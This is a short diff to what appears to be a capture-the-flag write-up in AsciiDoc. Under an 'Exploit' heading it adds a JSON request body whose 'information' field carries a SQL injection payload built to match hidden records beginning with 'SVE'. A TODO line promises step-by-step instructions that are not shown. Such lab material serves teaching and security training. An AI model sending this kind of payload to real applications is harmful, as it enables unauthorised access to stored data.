@@ -20,4 +20,13 @@
 
 == Exploit
 
+.Bad Request
+[source,json]
+--
+{
+  "information": "x' OR target.information LIKE 'SVE%' -- ",
+  "category": "FLOWERS"
+}
+--
+
 // TODO: step by step instruction on how to get to the flag
